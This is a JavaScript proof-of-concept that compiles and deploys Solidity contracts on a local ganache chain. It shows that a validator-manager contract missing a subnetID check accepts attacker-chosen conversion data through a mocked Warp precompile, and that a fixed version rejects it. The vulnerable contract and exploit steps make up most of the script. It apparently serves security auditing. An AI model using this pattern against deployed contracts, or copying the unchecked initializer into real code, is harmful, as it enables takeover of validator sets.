const solc = require('solc');
const ganache = require('ganache');
const { ethers } = require('ethers');

const source = `
pragma solidity ^0.8.30;
struct InitialValidator {
    bytes nodeID;
    uint64 weight;
    bytes blsPublicKey;
}
struct ConversionData {
    bytes32 subnetID;
    bytes32 validatorManagerBlockchainID;
    address validatorManagerAddress;
    InitialValidator[] initialValidators;
}
struct WarpMessage {
    bytes32 sourceChainID;
    address originSenderAddress;
    bytes payload;
}
interface IWarpMessenger {
    function getBlockchainID() external view returns (bytes32);
    function getVerifiedWarpMessage(uint32) external view returns (WarpMessage memory, bool);
}
library ValidatorMessages {
    uint16 constant CODEC_ID = 0;
    uint32 constant SUBNET_TO_L1_CONVERSION_MESSAGE_TYPE_ID = 0;
    function packSubnetToL1ConversionMessage(bytes32 conversionID) internal pure returns (bytes memory) {
        return abi.encodePacked(CODEC_ID, SUBNET_TO_L1_CONVERSION_MESSAGE_TYPE_ID, conversionID);
    }
    function unpackSubnetToL1ConversionMessage(bytes memory input) internal pure returns (bytes32) {
        require(input.length == 38, "bad len");
        bytes32 conversionID;
        for (uint i=0; i<32; i++) {
            conversionID |= bytes32(uint256(uint8(input[i+6])) << (8*(31-i)));
        }
        return conversionID;
    }
    function packConversionData(ConversionData memory conversionData) internal pure returns (bytes memory) {
        bytes memory res = abi.encodePacked(
            CODEC_ID,
            conversionData.subnetID,
            conversionData.validatorManagerBlockchainID,
            uint32(20),
            conversionData.validatorManagerAddress,
            uint32(conversionData.initialValidators.length)
        );
        for (uint i=0; i<conversionData.initialValidators.length; i++) {
            res = abi.encodePacked(
                res,
                uint32(conversionData.initialValidators[i].nodeID.length),
                conversionData.initialValidators[i].nodeID,
                conversionData.initialValidators[i].blsPublicKey,
                conversionData.initialValidators[i].weight
            );
        }
        return res;
    }
}
contract MockWarp is IWarpMessenger {
    bytes32 public blockchainID;
    WarpMessage public warpMsg;
    bool public valid;
    constructor() { valid = true; }
    function setBlockchainID(bytes32 id) external { blockchainID = id; }
    function setWarpMessage(WarpMessage memory m) external { warpMsg = m; }
    function setValid(bool v) external { valid = v; }
    function getBlockchainID() external view returns (bytes32) { return blockchainID; }
    function getVerifiedWarpMessage(uint32) external view returns (WarpMessage memory, bool) {
        return (warpMsg, valid);
    }
}
contract VulnerableManager {
    bytes32 public constant P_CHAIN_BLOCKCHAIN_ID = bytes32(0);
    IWarpMessenger public constant WARP_MESSENGER = IWarpMessenger(0x0200000000000000000000000000000000000005);
    bytes32 public _subnetID;
    bool public _initialized;
    uint64 public totalWeight;
    error InvalidValidatorManagerBlockchainID(bytes32);
    error InvalidValidatorManagerAddress(address);
    error InvalidConversionID(bytes32, bytes32);
    error InvalidSubnetID(bytes32);
    constructor(bytes32 subnetID_) { _subnetID = subnetID_; }
    function computeConversionID(ConversionData calldata conversionData) external pure returns (bytes32) {
        return sha256(ValidatorMessages.packConversionData(conversionData));
    }
    function getBlockchainIDFromWarp() external view returns (bytes32) {
        return WARP_MESSENGER.getBlockchainID();
    }
    function getWarpMessage(uint32 idx) external view returns (WarpMessage memory, bool) {
        return WARP_MESSENGER.getVerifiedWarpMessage(idx);
    }
    function initializeValidatorSetVulnerable(ConversionData calldata conversionData, uint32 messageIndex) external {
        if (_initialized) revert("already init");
        bytes32 chainID = WARP_MESSENGER.getBlockchainID();
        if (conversionData.validatorManagerBlockchainID != chainID) {
            revert InvalidValidatorManagerBlockchainID(conversionData.validatorManagerBlockchainID);
        }
        if (address(conversionData.validatorManagerAddress) != address(this)) {
            revert InvalidValidatorManagerAddress(address(conversionData.validatorManagerAddress));
        }
        (WarpMessage memory warpMessage, bool valid) = WARP_MESSENGER.getVerifiedWarpMessage(messageIndex);
        require(valid, "invalid warp");
        require(warpMessage.sourceChainID == P_CHAIN_BLOCKCHAIN_ID, "bad source");
        require(warpMessage.originSenderAddress == address(0), "bad origin");
        bytes32 conversionID = ValidatorMessages.unpackSubnetToL1ConversionMessage(warpMessage.payload);
        bytes32 encodedID = sha256(ValidatorMessages.packConversionData(conversionData));
        if (encodedID != conversionID) revert InvalidConversionID(encodedID, conversionID);
        uint64 tot;
        for (uint i=0; i<conversionData.initialValidators.length; i++) {
            tot += conversionData.initialValidators[i].weight;
        }
        totalWeight = tot;
        _initialized = true;
    }
    function initializeValidatorSetFixed(ConversionData calldata conversionData, uint32 messageIndex) external {
        if (_initialized) revert("already init");
        if (conversionData.subnetID != _subnetID) {
            revert InvalidSubnetID(conversionData.subnetID);
        }
        bytes32 chainID = WARP_MESSENGER.getBlockchainID();
        if (conversionData.validatorManagerBlockchainID != chainID) {
            revert InvalidValidatorManagerBlockchainID(conversionData.validatorManagerBlockchainID);
        }
        if (address(conversionData.validatorManagerAddress) != address(this)) {
            revert InvalidValidatorManagerAddress(address(conversionData.validatorManagerAddress));
        }
        (WarpMessage memory warpMessage, bool valid) = WARP_MESSENGER.getVerifiedWarpMessage(messageIndex);
        require(valid, "invalid warp");
        require(warpMessage.sourceChainID == P_CHAIN_BLOCKCHAIN_ID, "bad source");
        require(warpMessage.originSenderAddress == address(0), "bad origin");
        bytes32 conversionID = ValidatorMessages.unpackSubnetToL1ConversionMessage(warpMessage.payload);
        bytes32 encodedID = sha256(ValidatorMessages.packConversionData(conversionData));
        if (encodedID != conversionID) revert InvalidConversionID(encodedID, conversionID);
        uint64 tot;
        for (uint i=0; i<conversionData.initialValidators.length; i++) {
            tot += conversionData.initialValidators[i].weight;
        }
        totalWeight = tot;
        _initialized = true;
    }
}
`;

const input = {
  language: 'Solidity',
  sources: { 'V.sol': { content: source } },
  settings: { evmVersion: 'paris', outputSelection: { '*': { '*': ['abi', 'evm.bytecode'] } }, optimizer: { enabled: true, runs: 200 } }
};
const output = JSON.parse(solc.compile(JSON.stringify(input), { import: (p)=>({error:'not found'}) }));
const contracts = output.contracts['V.sol'];
const abi = contracts['VulnerableManager'].abi;
const bytecode = contracts['VulnerableManager'].evm.bytecode.object;
const mockABI = contracts['MockWarp'].abi;
const mockBytecode = contracts['MockWarp'].evm.bytecode.object;

async function main() {
  const provider = ganache.provider({ logging: { quiet: true } });
  const ethersProvider = new ethers.providers.Web3Provider(provider);
  const signer = ethersProvider.getSigner(0);

  const MockFactory = new ethers.ContractFactory(mockABI, mockBytecode, signer);
  const mock = await MockFactory.deploy();
  await mock.deployed();
  const mockCode = await ethersProvider.getCode(mock.address);
  const precompile = "0x0200000000000000000000000000000000000005";
  await provider.send("evm_setAccountCode", [precompile, mockCode]);

  const VICTIM_SUBNET = "0x1234567812345678123456781234567812345678123456781234567812345678";
  const CHAIN_ID = "0xabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcd";
  const VulnFactory = new ethers.ContractFactory(abi, bytecode, signer);
  const vulnerable = await VulnFactory.deploy(VICTIM_SUBNET);
  await vulnerable.deployed();

  const validators = [
    { nodeID: "0x2341234123412341234123412341234123412341", blsPublicKey: "0x123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678", weight: 10000000000 },
    { nodeID: "0x3412341234123412341234123412341234123412", blsPublicKey: "0x123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678", weight: 1000000 }
  ];

  function packConversionData(subnetID, chainID, managerAddr, vals) {
    let packed = ethers.utils.concat([
      ethers.utils.arrayify(ethers.utils.solidityPack(["uint16"], [0])),
      ethers.utils.arrayify(subnetID),
      ethers.utils.arrayify(chainID),
      ethers.utils.arrayify(ethers.utils.solidityPack(["uint32"], [20])),
      ethers.utils.arrayify(managerAddr),
      ethers.utils.arrayify(ethers.utils.solidityPack(["uint32"], [vals.length]))
    ]);
    for (const v of vals) {
      const nodeIDBytes = ethers.utils.arrayify(v.nodeID);
      const blsBytes = ethers.utils.arrayify(v.blsPublicKey);
      const part = ethers.utils.concat([
        ethers.utils.arrayify(ethers.utils.solidityPack(["uint32"], [nodeIDBytes.length])),
        nodeIDBytes,
        blsBytes,
        ethers.utils.arrayify(ethers.utils.solidityPack(["uint64"], [v.weight]))
      ]);
      packed = ethers.utils.concat([packed, part]);
    }
    return packed;
  }

  const ATTACKER_SUBNET = "0x8765432187654321876543218765432187654321876543218765432187654321";
  const packed = packConversionData(ATTACKER_SUBNET, CHAIN_ID, vulnerable.address, validators);
  const conversionID_js = ethers.utils.sha256(packed);

  const attackerDataForCall = {
    subnetID: ATTACKER_SUBNET,
    validatorManagerBlockchainID: CHAIN_ID,
    validatorManagerAddress: vulnerable.address,
    initialValidators: validators.map(v => ({ nodeID: v.nodeID, weight: v.weight, blsPublicKey: v.blsPublicKey }))
  };

  const warpPayload = ethers.utils.concat([
    ethers.utils.arrayify(ethers.utils.solidityPack(["uint16", "uint32"], [0, 0])),
    ethers.utils.arrayify(conversionID_js)
  ]);

  await mock.setBlockchainID(CHAIN_ID);
  await mock.setWarpMessage({
    sourceChainID: ethers.constants.HashZero,
    originSenderAddress: ethers.constants.AddressZero,
    payload: ethers.utils.hexlify(warpPayload)
  });
  await mock.setValid(true);
  const precompileAsMock = new ethers.Contract(precompile, mockABI, signer);
  await precompileAsMock.setBlockchainID(CHAIN_ID);
  await precompileAsMock.setWarpMessage({
    sourceChainID: ethers.constants.HashZero,
    originSenderAddress: ethers.constants.AddressZero,
    payload: ethers.utils.hexlify(warpPayload)
  });
  await precompileAsMock.setValid(true);

  console.log("Testing vulnerable...");
  try {
    const tx = await vulnerable.initializeValidatorSetVulnerable(attackerDataForCall, 0, { gasLimit: 1000000 });
    await tx.wait();
    console.log("VULNERABLE SUCCESS - BUG CONFIRMED");
    console.log("initialized", await vulnerable._initialized(), "totalWeight", (await vulnerable.totalWeight()).toString());
  } catch (e) {
    console.log("VULNERABLE FAILED", e.message.slice(0,2000));
    try {
      await vulnerable.callStatic.initializeValidatorSetVulnerable(attackerDataForCall, 0);
    } catch (e2) {
      console.log("callStatic failed", e2.message.slice(0,2000));
    }
  }

  const fixed = await VulnFactory.deploy(VICTIM_SUBNET);
  await fixed.deployed();
  const packedFixed = packConversionData(ATTACKER_SUBNET, CHAIN_ID, fixed.address, validators);
  const conversionIDFixed = ethers.utils.sha256(packedFixed);
  const warpPayloadFixed = ethers.utils.concat([
    ethers.utils.arrayify(ethers.utils.solidityPack(["uint16", "uint32"], [0, 0])),
    ethers.utils.arrayify(conversionIDFixed)
  ]);
  await mock.setWarpMessage({
    sourceChainID: ethers.constants.HashZero,
    originSenderAddress: ethers.constants.AddressZero,
    payload: ethers.utils.hexlify(warpPayloadFixed)
  });
  await precompileAsMock.setWarpMessage({
    sourceChainID: ethers.constants.HashZero,
    originSenderAddress: ethers.constants.AddressZero,
    payload: ethers.utils.hexlify(warpPayloadFixed)
  });
  const attackerDataFixed = {
    subnetID: ATTACKER_SUBNET,
    validatorManagerBlockchainID: CHAIN_ID,
    validatorManagerAddress: fixed.address,
    initialValidators: validators.map(v => ({ nodeID: v.nodeID, weight: v.weight, blsPublicKey: v.blsPublicKey }))
  };
  console.log("\nTesting fixed...");
  try {
    const tx = await fixed.initializeValidatorSetFixed(attackerDataFixed, 0, { gasLimit: 1000000 });
    await tx.wait();
    console.log("FIXED SUCCESS unexpected");
  } catch (e) {
    console.log("FIXED REVERTED as expected", e.message.slice(0,1000));
  }
}
main();
